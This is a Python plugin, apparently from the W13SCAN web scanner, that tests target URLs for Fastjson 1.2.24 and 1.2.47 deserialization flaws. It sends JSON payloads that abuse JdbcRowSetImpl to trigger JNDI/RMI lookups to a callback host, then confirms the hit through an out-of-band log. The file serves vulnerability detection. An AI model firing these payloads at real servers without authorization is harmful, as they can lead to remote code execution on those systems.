#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2020/4/7 10:15 AM
# @Author  : w8ay
# @File    : poc_fastjson.py
import json

import requests

from lib.api.dnslog import DnsLogApi
from lib.api.reverse_api import reverseApi
from lib.core.common import random_str, generateResponse
from lib.core.enums import POST_HINT, VulType, PLACE
from lib.core.plugins import PluginBase


class W13SCAN(PluginBase):
    name = 'Fastjson Poc'

    def generate_payload_1_2_24(self, domain):
        # for fastjson 1.2.24
        fastjson_payload = {
            random_str(4): {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "rmi://{}".format(domain),
                "autoCommit": True
            }
        }
        return json.dumps(fastjson_payload)

    def generate_payload_1_2_47(self, domain):
        # for fastjson 1.2.47
        fastjson_payload = {
            random_str(4): {
                "@type": "java.lang.Class",
                "val": "com.sun.rowset.JdbcRowSetImpl"
            },
            random_str(4): {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "rmi://{}".format(domain),
                "autoCommit": True
            }
        }
        return json.dumps(fastjson_payload)

    def generate_check_fastjson(self, domain):
        payload = {random_str(4): {"@type": "java.net.Inet4Address", "val": domain}}
        return json.dumps(payload)

    def audit(self):
        headers = self.requests.headers
        if self.requests.post_hint == POST_HINT.JSON or self.requests.post_hint == POST_HINT.JSON_LIKE:
            # 第三方平台
            # dnslog = DnsLogApi()
            # dnsdomain = random_str(4) + "." + dnslog.new_domain()

            # 检测是否使用fastjson for 1.2.67
            # refer:https://github.com/alibaba/fastjson/issues/3077
            # r = requests.post(self.requests.url, data=self.generate_check_fastjson(dnsdomain), headers=headers)
            # isFastjson = dnslog.check()
            # if isFastjson:
            #     result = self.new_result()
            #     result.init_info(self.requests.url, "使用了Fastjson", VulType.CODE_INJECTION)
            #     result.add_detail("payload", r.reqinfo, generateResponse(r),
            #                       "第三方dnslog有日志回显:{}".format(repr(isFastjson)), "", "", PLACE.GET)
            #     self.success(result)
            # else:
            #     return

            # reqlist = []
            # for payload in [self.generate_payload_1_2_24(dnsdomain), self.generate_payload_1_2_47(dnsdomain)]:
            #     r = requests.post(self.requests.url, data=payload, headers=headers)
            #     reqlist.append(r)
            # dnslist = dnslog.check()
            # if dnslist:
            #     result = self.new_result()
            #     result.init_info(self.requests.url, "Fastjson Poc 1.24-1.27", VulType.CODE_INJECTION)
            #     for req in reqlist:
            #         result.add_detail("payload请求", req.reqinfo, generateResponse(req),
            #                           "第三方dnslog有日志回显:{}".format(repr(dnslist)), "", "", PLACE.POST)
            #     self.success(result)
            # 内置rmi平台
            rmi = reverseApi()
            if rmi.isUseReverse():
                rmidomain = rmi.generate_rmi_token()
                rmi_token = rmidomain["token"]
                fullname = rmidomain["fullname"]

                reqlist = []
                for payload in [self.generate_payload_1_2_24(fullname), self.generate_payload_1_2_47(fullname)]:
                    r = requests.post(self.requests.url, data=payload, headers=headers)
                    reqlist.append(r)
                dnslist = rmi.check(rmi_token)
                if dnslist:
                    result = self.new_result()
                    result.init_info(self.requests.url, "Fastjson Poc 1.24-1.27", VulType.CODE_INJECTION)
                    for req in reqlist:
                        result.add_detail("payload请求", req.reqinfo, generateResponse(req),
                                          "内置rmi 有日志回显:{}".format(repr(dnslist)), "", "", PLACE.POST)
                    self.success(result)
